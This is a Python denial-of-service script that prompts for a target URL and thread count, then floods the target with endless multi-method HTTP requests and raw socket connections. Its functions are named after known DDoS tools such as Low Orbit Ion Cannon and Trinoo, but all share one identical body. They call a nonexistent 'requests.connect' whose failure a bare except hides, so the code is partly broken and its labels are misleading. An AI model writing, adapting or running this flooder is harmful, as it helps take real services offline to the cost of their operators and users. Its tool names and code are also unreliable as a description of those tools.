import requests
import threading
import socket
import os
import sys

def http_flood(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def low_orbit_ion_cannon(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def hping3(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def black_scope(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def trinoo(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def golden_eye(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def shaft(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def achilles(target_url):
    while True:
        try:
            requests.get(target_url)
            requests.post(target_url)
            requests.head(target_url)
            requests.put(target_url)
            requests.delete(target_url)
            requests.options(target_url)
            requests.connect(target_url)
            requests.patch(target_url)
        except:
            pass

def socket_flood(target_url):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_url, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_url.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

def main():
    target_url = input("Enter target URL: ")
    num_threads = int(input("Enter number of threads: "))

    for i in range(num_threads):
        threading.Thread(target=http_flood, args=(target_url,)).start()
        threading.Thread(target=low_orbit_ion_cannon, args=(target_url,)).start()
        threading.Thread(target=hping3, args=(target_url,)).start()
        threading.Thread(target=black_scope, args=(target_url,)).start()
        threading.Thread(target=trinoo, args=(target_url,)).start()
        threading.Thread(target=golden_eye, args=(target_url,)).start()
        threading.Thread(target=shaft, args=(target_url,)).start()
        threading.Thread(target=achilles, args=(target_url,)).start()
        threading.Thread(target=socket_flood, args=(target_url,)).start()

if __name__ == "__main__":
    main()
